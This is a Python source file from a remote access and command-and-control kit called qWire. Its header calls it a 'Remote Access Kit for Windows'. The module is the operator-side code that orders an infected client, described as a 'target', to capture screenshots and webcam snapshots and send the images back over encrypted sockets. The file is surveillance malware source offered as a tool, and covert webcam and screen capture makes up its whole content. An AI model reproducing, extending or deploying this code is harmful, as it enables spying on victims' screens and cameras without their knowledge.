#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.21
# -------------------------------------------------------------
from core.networking.sockets.server_socket import ServerSocket
from core.networking.sockets.stream_socket import StreamingSocket
from core.networking.sockets.receiver_socket import ReceiverSocket
from core.logging.logging import ConsoleWindow
from core.client_handling.flags import ClientActionFlags
from core.threading.threads import MultiThreading

BUFFER = 4096

class Streaming:

    #Function will tell client to take a screenshot, and then create a thread to receive the photo
    def get_client_screenshot(self, encryption_key,client):
        flag = f'{ClientActionFlags().screenshot}{ClientActionFlags().seperator} '        #Action flag
        ServerSocket().send_data_to_client(client,encryption_key,flag)                           #Tell client to take photo
        MultiThreading().create_background_thread(StreamingSocket().recv_img_data()) #Create thread to receive photo

    #Function will tell client to take a snapshot from webcam and then receive the snapshot if
    #a webcam is present on the client. Returns bool based on result to tell server
    #if it should open a socket or not.
    def get_client_snapshot(self,encryption_key,client):
        flag = f'{ClientActionFlags().snapshot}{ClientActionFlags().seperator} '   #Create data flag for client
        ServerSocket().send_data_to_client(client,encryption_key,flag)             #Sent flag
        status = ReceiverSocket().recv_string(encryption_key)                      #Store response in variable
        if status == 'NoneFound':                                                  #If the agent does not find a webcam
            ConsoleWindow().log_to_console('Agent could not find webcam on target') #Log to console
            return False                                                            #Return false so server doesn't open socket
        elif status == 'Found':                                                    #Else if the agent does find a webcam,
            StreamingSocket().recv_img_data()                                      #Open a socket and receive the data
            ConsoleWindow().log_to_console('Got webcam data from agent')           #Log to console
            return True                                                            #Return true since we were able to retrieve the data
